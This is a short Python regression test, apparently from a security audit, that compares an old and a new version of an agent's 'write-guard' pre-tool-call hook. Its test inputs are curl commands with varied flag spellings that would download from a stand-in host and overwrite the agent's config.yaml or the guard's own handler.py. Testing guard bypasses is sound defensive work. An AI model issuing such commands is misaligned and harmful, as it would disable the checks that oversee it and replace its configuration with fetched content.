
import importlib.util, os
os.environ["HERMES_HOME"] = r"D:\myagent\.hermes"
os.chdir(r"D:\myagent\workspace")
def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    return m
A = load("wga", r"D:\myagent\workspace\write-guard\reviews\audit-round13-sec\handler_r12.py")
B = load("wgb", r"D:\myagent\workspace\write-guard\handler.py")
def act(mod, cmd):
    r = mod.on_pre_tool_call("terminal", {"command": cmd})
    return (r or {}).get("action") or "PASS"
CFG = "D:/myagent/.hermes/config.yaml"
HD = "D:/myagent/.hermes/plugins/write-guard/handler.py"
forms = {
 "E1 curl \"-so<CFG>\" (fixed cmd)": 'curl "-so' + CFG + '" http://x',
 "E4 curl \"-o<handler.py>\"": 'curl "-o' + HD + '" http://x',
 "K16 curl -so CFG bare (r12 face)": "curl -so " + CFG + " http://x",
 "K17 curl -oCFG bare glue": "curl -o" + CFG + " http://x",
 "K18 curl -sfo=CFG": "curl -sfo=" + CFG + " http://x",
}
for k, c in forms.items():
    a = act(A, c); b = act(B, c)
    print(("SAME " if a == b else "DIFF ") + (a + " -> " + b).ljust(19), k)
